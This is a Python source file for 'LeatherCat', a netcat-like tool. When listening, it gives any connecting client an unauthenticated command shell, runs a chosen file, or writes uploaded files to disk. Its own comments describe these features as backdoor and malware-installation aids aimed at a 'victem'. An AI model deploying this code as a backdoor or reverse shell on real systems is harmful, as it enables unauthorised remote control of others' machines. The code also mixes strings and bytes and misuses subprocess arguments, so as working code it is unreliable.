#___Import and set up globals___
import socket
import threading
import sys
import subprocess
import getopt

listen = False
execute = ""
command = False
upload = False
upload_destination = ""
target = ""
port = 0

#___Instructions to use commandline interface___
def how_to_use():
    print("________LeatherCat, A Networking Multimeter________")
    print("How to use:")
    print()
    print("LeatherCat.py -t <target_host> -p <port> [options]")
    print("LeatherCat.py -t 192.168.0.254 -p 54321 -l -e = \"pc /etc/www\"")
    print("echo 'Much Meow goes here' | ./LeatherCat.py -t 192.168.0.1 -p 4321")
    print()
    print("  -c --command               -Start a shell")
    print("  -l --listen                -Listen for incoming connections on [host]:[port]")
    print("  -e --execute = your_file   -Executes file after a connection is made (good for adding backdoor functionality).")
    print("  -u --upload = directory    -Upload and write a file to the destination after the connection is made.")
    print()
    #sys.exit(0)



def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #set up TCP stream
    try:
        #connect to our target host
        client.connect((target,port))
        if len(buffer):#check if stdin captured any input
            client.send (buffer)#send data to remote target

        while True:#Sends and receives data until user kills the script
            recv_len=1
            response=""
            while recv_len:#wait to capture a response back from the remote target
                data = client.recv(4096)
                recv_len = len(data)
                response+= data
                if recv_len < 4096:
                    break
            print(response),
            #wait for user input
            buffer = input("")
            buffer+= "\n"
            client.send(buffer)

    except:
        print("Exception thrown, closing the client.")
        client.close()

#____Logic for file uploads, command execution, and shell commuunication____
def client_handler(client_socket):
    global command
    global execute
    global upload

    if len(upload_destination):#can be usefull for malware installation and removal of python callback
        file_buffer=""
        #Read in client output
        while True:
            data = client_socket.recv(1024) #store incoming file data
            if not data:
                break
            else:
                file_buffer += data #keep appending the file data
        #Try to write out captured data
        try:
            file_descriptor = open(upload_destination, "wb")#wb enables us to write in binary mode so Bin files will write correctly
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            #Comfirm incooming data was written to a file
            client_socket.send("Incoming client socket data saved to: %s\r\n" % upload_destination)

        except:
            client_socket.send("Failed to save incoming client socket data to file: %s\r\n" % upload_destination)
    #run command localy and send back to the client
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    #Command shell was requesteed 
    if command:
        while True:
            client_socket.send("Hack'n'Slash:#> ")#Our personal shell
            cmd_buffer = ""
            while "\n" not in cmd_buffer: #Pulls data until 'enter' escapes and command is then executed
                cmd_buffer += client_socket.recv(1024)
            #handles buffer internaly then forwards the response.
            response = run_command(cmd_buffer)#if using a script to run this function remember to terninate with '\n' to finish the call
            client_socket.send(response)

#____run the command output locally and send it back to the client____
def run_command(command):
    command = command.rstrip()#removes trailing characters , \n
    try:
        output = subprocess.check_output(command, stdin=subprocess.STDOUT, shell=True)
    except:
        output = "Command failed \r\n" #lets us know if a command failed so we dont think that it sent it when it really didnt
    return output

#___called by Listening command, sets up connection and thread____
def server_loop():
    global target
    if not len(target):
        target = "0.0.0.0" #if not specified then listen for all ipv4 connections

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #set up TCP stream
    server.bind((target, port))     #bind to victem
    server.listen()                 #listen on specified port
    while True:
        client_socket, address = server.accept()
        #start thread to handle client communications
        client_thread = threading.Thread(target=client_handler, args = (client_socket,))
        client_thread.start()

#___Main sets variables according to commandline args and either calls server_loop or client_sender ___
def main():
    global listen
    global execute
    global command
    global upload_destination
    global target
    global port

    if not len(sys.argv[1:]): #gets list of user supplied arguments without pulling the script name [1:]
        how_to_use()               #If no args are found then it call how_to_use to print commandline instructions

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "command", "upload", "target", "port"])
    except getopt.GetoptError as err:
        print(str(err))   # will print something like "option -a not recognized"
        how_to_use()
        sys.exit(2)       #will remove in later version
    for o, a in opts:
        if o in ("-h", "--help"):
            how_to_use()
            sys.exit(0)
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)  #string to int cast
        else:
            assert False, "Unhandled Option"

    #Read stdin and send data accross network by calling client__sender
    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()# CTRL-D will bypass stdin
        client_sender(buffer)
    if listen:
        server_loop() 

main()
